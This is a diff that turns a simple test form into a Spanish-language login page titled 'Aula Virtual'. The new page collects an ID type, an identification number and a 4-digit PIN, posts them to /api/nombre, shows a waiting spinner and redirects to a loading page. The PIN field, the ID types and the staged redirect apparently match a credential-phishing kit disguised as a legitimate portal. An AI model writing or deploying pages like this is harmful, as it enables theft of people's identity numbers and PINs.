@@ -1,36 +1,103 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-  <title>Enviar solicitud</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aula Virtual</title>
+<link rel="stylesheet" href="css/styles.css">
 </head>
+
 <body>
 
-<h2>Formulario de prueba</h2>
+<!-- SPINNER -->
+<div id="spinner-overlay" style="display:none;position:fixed;inset:0;background:#fff;z-index:999;align-items:center;justify-content:center;flex-direction:column">
+<img src="images/ban.png" width="120">
+<p>Espere un momento...</p>
+</div>
 
-<form id="form">
-  <input type="text" id="nombre" placeholder="Nombre" required>
-  <button type="submit">Enviar</button>
+<div class="container">
+
+<!-- FORM -->
+<form id="segura">
+
+<h2>Bienvenido a tu aula Virtual</h2>
+
+<select id="tipo" required>
+<option value="">Seleccione tipo</option>
+<option value="CC">Cédula</option>
+<option value="TI">Tarjeta identidad</option>
+</select>
+
+<input id="identificacion" placeholder="Identificación" required>
+
+<input id="clave" placeholder="Clave 4 dígitos" maxlength="4" required>
+
+<button  style="
+                      width: 100%;
+                      background: #0043a9;
+                      border-radius: 20px;
+                      padding: 20p;
+                      color: white;
+                      margin-top: 30px;
+                    "  type="submit">Ingresar</button>
+
 </form>
 
+</div>
+
 <script>
-document.getElementById("form").addEventListener("submit", async (e) => {
-  e.preventDefault();
+const form = document.getElementById("segura");
 
-  const nombre = document.getElementById("nombre").value;
+form.addEventListener("submit", async e=>{
+ e.preventDefault();
 
-  const res = await fetch("/api/solicitud", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ nombre })
-  });
+ const tipo = document.getElementById("tipo").value.trim();
+ const identificacion = document.getElementById("identificacion").value.trim();
+ const clave = document.getElementById("clave").value.trim();
 
-  const data = await res.json();
+ if(!tipo || !identificacion || !clave){
+   alert("Complete todos los campos");
+   return;
+ }
 
-  if (data.requestId) {
-    localStorage.setItem("requestId", data.requestId);
-    window.location.href = "load.html";
-  }
+ if(!/^\d{4}$/.test(clave)){
+   alert("La clave debe tener 4 dígitos");
+   return;
+ }
+
+ document.getElementById("spinner-overlay").style.display="flex";
+
+ try{
+
+ const r = await fetch("/api/nombre",{
+  method:"POST",
+  headers:{ "Content-Type":"application/json"},
+  body:JSON.stringify({
+    tipo,
+    identificacion,
+    clave
+  })
+ });
+
+ const j = await r.json();
+
+ if(!j.id){
+   alert("Error servidor");
+   location.reload();
+   return;
+ }
+
+ localStorage.setItem("id", j.id);
+
+ location="load.html";
+
+ }catch(err){
+   console.error(err);
+   alert("Error de conexión");
+   location.reload();
+ }
 });
+
 </script>
 
 </body>
